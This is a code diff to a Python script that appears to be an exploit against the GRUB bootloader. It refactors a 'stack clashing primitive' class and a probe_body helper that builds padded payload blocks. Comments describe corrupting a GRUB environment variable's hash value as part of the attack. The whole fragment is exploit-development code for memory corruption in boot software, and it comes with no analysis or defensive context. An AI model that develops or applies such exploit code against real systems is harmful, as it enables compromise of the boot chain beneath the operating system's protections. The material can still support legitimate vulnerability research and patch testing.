@@ -13,6 +13,16 @@ from util import command, find_root, grub_print, force_regions_to_exist, \
         grub_mm_header_t, hashval, Variable
 
 
+def probe_body(body):
+    pre = b'b'*(48)
+    post = b'c'*64
+    spare = BLOCK_SIZE - (len(pre) + len(post))
+    rest = body * (spare // len(body))
+    to_add = BLOCK_SIZE - (len(rest) + len(pre) + len(post))
+    rest += b'\x00' * to_add
+    return pre + rest + post
+
+
 class Primitive:
     """
     The stack clashing primitive.
@@ -24,8 +34,8 @@ class Primitive:
         self._rf = RecursiveFuncs(f'trigger_{name}')
         self._name = name
         self._filename = name
-        self._body = body
-        assert len(body) == BLOCK_SIZE
+        self._body = probe_body(body)
+        assert len(self._body) == BLOCK_SIZE
 
     def setup(self, basepath):
         # using it twice to give us a second chance with the protective mbr +
@@ -80,16 +90,6 @@ class Primitive:
         return res
 
 
-def probe_body(body):
-    pre = b'b'*(48)
-    post = b'c'*64
-    spare = BLOCK_SIZE - (len(pre) + len(post))
-    rest = body * (spare // len(body))
-    to_add = BLOCK_SIZE - (len(rest) + len(pre) + len(post))
-    rest += b'\x00' * to_add
-    return pre + rest + post
-
-
 def main():
     # we use these after we corrupt a grub_env_var with the hashval of 0, so we
     # need to make sure they aren't in the same hashtable entry
@@ -118,10 +118,10 @@ def main():
     print(len(control_b), len(probe_b))
     assert len(control_b) == len(probe_b)
 
-    probe = Primitive('base', probe_body(probe_b))
+    probe = Primitive('base', probe_b)
     probe.setup(basepath)
 
-    control = Primitive('over', probe_body(control_b))
+    control = Primitive('over', control_b)
     control.setup(basepath)
 
     vs = VarSplit(TRASH_ALLOC)
